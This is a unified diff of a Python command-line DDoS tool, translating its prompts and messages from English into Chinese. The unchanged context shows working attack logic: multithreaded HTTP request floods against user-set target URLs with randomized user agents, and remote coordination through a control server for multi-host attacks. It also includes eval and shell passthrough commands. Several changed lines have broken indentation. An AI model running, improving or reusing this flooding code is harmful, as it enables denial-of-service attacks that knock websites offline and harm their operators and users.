@@ -56,15 +56,15 @@ class Main:
 		event.commands(self.run_shell, ".")
 		event.commands(self.debug, "$")
 
-		event.help(["values", "ls"], "Show all options.")
+event.help(["values", "ls"], "显示所有选项。")
 
-		event.help("target", "Set the target.")
-		event.help("targets", "Set multiple targets.")
-		event.help("threads", "Amount of threads to use.")
-		event.help("sleep", "Delay between threads.")
-		event.help("interval", "Delay between each packet send.")
-		event.help("agent", "Define a user agent instead of a random ones.")
-		event.help("run", "Run the stress test.")
+			event.help("target", "设置目标。")
+			event.help("targets", "设置多个目标。")
+			event.help("threads", "使用线程数。")
+			event.help("sleep", "线程间延迟。")
+			event.help("interval", "每个数据包发送间隔。")
+			event.help("agent", "定义一个用户代理，代替随机代理。")
+			event.help("run", "运行压力测试。")
 
 	def banner(self):
 		system("clear || cls")
@@ -81,12 +81,12 @@ C_B----------------------------------------------------------C_W""").replace("C_
 		self.help()
 
 	def exit_console(self):
-		print("Have a nice day.")
+		print("祝您愉快。")
 		quit()
 
 	def run_shell(self, command):
 		print("")
-		system(tools.arg("Enter shell command: ", ". ", command))
+		system(tools.arg("输入 shell 命令：", ". ", command))
 		print("")
 
 	def check_session(self):
@@ -116,7 +116,7 @@ C_B----------------------------------------------------------C_W""").replace("C_
 
 	def debug(self, command):
 		print("")
-		eval(tools.arg("Enter debug command: ", "$ ", command))
+		eval(tools.arg("输入调试命令：", "$ ", command))
 		print("")
 
 	@event.command
@@ -131,13 +131,13 @@ C_B----------------------------------------------------------C_W""").replace("C_
 	def debug():
 		var.l7_debug = True
 		print("")
-		print("Debugging mode enabled.")
+		print("调试模式已启用。")
 		print("")
 
 	@event.event
 	def on_command_not_found(command):
 		print("")
-		print("The command you entered does not exist.")
+		print("您输入的命令不存在。")
 		print("")
 
 	@event.event
@@ -148,7 +148,7 @@ C_B----------------------------------------------------------C_W""").replace("C_
 			status = requests.post((var.server[2] + "set/com"), data={"password": var.server[3], "data": command}).text
 			if status != "200":
 				print("")
-				print("An error occured, while sending commands to the server.")
+				print("向服务器发送命令时发生错误。")
 				print("")
 
 	@event.event
@@ -158,12 +158,12 @@ C_B----------------------------------------------------------C_W""").replace("C_
 
 	def show_values(self):
 		print("")
-		print("Targets: %s" % var.target)
-		print("Threads: %s" % var.threads)
-		print("Delay between threads: %s" % var.sleep)
-		print("Delay between packets: %s" % var.interval)
+		print("目标：%s" % var.target)
+		print("线程：%s" % var.threads)
+		print("线程间延迟：%s" % var.sleep)
+		print("每包间隔：%s" % var.interval)
 		if len(var.user_agents) == 1:
-			print("User Agent: %s" % var.user_agents[0])
+			print("用户代理：%s" % var.user_agents[0])
 		print("")
 
 	def help(self):
@@ -174,51 +174,51 @@ C_B----------------------------------------------------------C_W""").replace("C_
 	@event.command
 	def targets(command):
 		print("")
-		var.target = tools.arg("URLS (Seperated by ', '): ", "targets ", command).split(", ")
+		var.target = tools.arg("URL（用 ', ' 分隔）：", "targets ", command).split(", ")
 		for url in var.target:
 			if "http" not in url:
-				print("%s is a invalid URL." % url)
+				print("%s 不是有效的 URL。" % url)
 		print("")
 
 	@event.command
 	def target(command):
 		print("")
-		var.target = [tools.arg("URL (GET Parameters possible): ", "target ", command)]
+		var.target = [tools.arg("URL（可包含 GET 参数）：", "target ", command)]
 		if "http" not in var.target[0]:
-			print("This URL is invalid.")
+			print("该 URL 无效。")
 		print("")
 
 	@event.command
 	def threads(command):
 		print(" ")
 		try:
-			var.threads = int(tools.arg("Threads: ", "threads ", command))
+			var.threads = int(tools.arg("线程：", "threads ", command))
 		except Exception as e:
-			print("There was an error while executing.", e)
+			print("执行时发生错误。", e)
 		print(" ")
 
 	@event.command
 	def sleep(command):
 		print(" ")
 		try:
-			var.sleep = float(tools.arg("Delay between each thread: ", "sleep ", command))
+			var.sleep = float(tools.arg("线程间延迟：", "sleep ", command))
 		except Exception as e:
-			print("There was an error while executing.", e)
+			print("执行时发生错误。", e)
 		print(" ")
 
 	@event.command
 	def interval(command):
 		print(" ")
 		try:
-			var.interval = float(tools.arg("Delay between each packet: ", "interval ", command))
+			var.interval = float(tools.arg("每包间隔：", "interval ", command))
 		except Exception as e:
-			print("There was an error while executing.", e)
+			print("执行时发生错误。", e)
 		print(" ")
 
 	@event.command
 	def agent(command):
 		print(" ")
-		var.user_agents = [tools.arg("Enter a user agent: ", "agent ", command)]
+		var.user_agents = [tools.arg("输入用户代理：", "agent ", command)]
 		print(" ")
 
 	def ddos(self):
@@ -226,13 +226,13 @@ C_B----------------------------------------------------------C_W""").replace("C_
 			for url in var.target:
 				try:
 					response = urllib.request.urlopen(urllib.request.Request(url, headers={'User-Agent': choice(var.user_agents), "Connection": "keep-alive", "Accept-Encoding": "gzip, deflate", "Keep-Alive": randint(110,120)}), timeout=999)  # noqa
-					var.command_log.append("Sucessful execution.")
+					var.command_log.append("执行成功。")
 				except Exception as ex:
-					print("Request failed.")
-					var.command_log.append("ERROR: %s" % ex)
+					print("请求失败。")
+					var.command_log.append("错误：%s" % ex)
 					if var.l7_debug:
-						print("ERROR: %s" % ex)
-				print("Request received.")
+						print("错误：%s" % ex)
+				print("请求已接收。")
 			sleep(var.interval)
 		var.stoped_threads += 1
 
@@ -240,7 +240,7 @@ C_B----------------------------------------------------------C_W""").replace("C_
 	def run():
 		def execute():
 			print("")
-			print("To stop the attack press: ENTER or CTRL + C")
+			print("停止攻击请按：ENTER 或 CTRL + C")
 			print("")
 
 			var.ps1 = ""  # Change due to threading bug.
@@ -252,7 +252,7 @@ C_B----------------------------------------------------------C_W""").replace("C_
 					t.start()
 					sleep(var.sleep)
 				except Exception:
-					print("Could not start thread %s." % thread)
+					print("无法启动线程 %s。" % thread)
 
 			def reset_attack():
 				print("Stopping threads...")
@@ -265,7 +265,7 @@ C_B----------------------------------------------------------C_W""").replace("C_
 						sleep(1)
 
 				if var.l7_debug:
-					print("Saving debugging log...")
+					print("正在保存调试日志...")
 					output_to = path.join(getcwd(), "l7_debug_log.txt")
 
 					write_method = "a"
@@ -281,7 +281,7 @@ C_B----------------------------------------------------------C_W""").replace("C_
 					output_file.write(str(version + "\n"))
 					output_file.write(str("\n".join(var.command_log)))
 					output_file.close()
-				print("Done.")
+				print("完成。")
 				quit()
 
 			def check_stopped_execution():
@@ -303,7 +303,7 @@ C_B----------------------------------------------------------C_W""").replace("C_
 			if var.server[0] and var.server[1]:
 				status = requests.post((var.server[2] + "set/agreed"), data={"password": var.server[3], "data": "False"}).text
 				if status != "200":
-					print("An error occured, while sending data to the server.")
+					print("发送数据到服务器时发生错误。")
 
 			reset_attack()
 
@@ -315,27 +315,27 @@ C_B----------------------------------------------------------C_W""").replace("C_
 					break
 				else:
 					sleep(1)
-		elif not tools.question("\nDo you agree to the terms of use?"):
-			print("Agreement not accepted.")
+		elif not tools.question("\n您是否同意使用条款？"):
+			print("未接受协议。")
 			quit()
 		else:
 			if var.server[0] and var.server[1]:
-				if tools.question("\nWould you like to use the host as part of the ddos?"):
+				if tools.question("\n是否希望将该主机用作 DDoS 的一部分？"):
 					status = requests.post((var.server[2] + "set/agreed"), data={"password": var.server[3], "data": "True"}).text
 					if status != "200":
-						print("An error occured, while sending data to the server.")
+						print("发送数据到服务器时发生错误。")
 					execute()
 				else:
 					status = requests.post((var.server[2] + "set/agreed"), data={"password": var.server[3], "data": "True"}).text
 					if status != "200":
-						print("An error occured, while sending data to the server.")
+						print("发送数据到服务器时发生错误。")
 					try:
-						print("[Press Enter to stop the attack.]")
+						print("[按回车停止攻击。]")
 					except KeyboardInterrupt:
 						pass
 					status = requests.post((var.server[2] + "set/agreed"), data={"password": var.server[3], "data": "False"}).text
 					if status != "200":
-						print("An error occured, while sending data to the server.")
+						print("发送数据到服务器时发生错误。")
 			else:
 				execute()
 
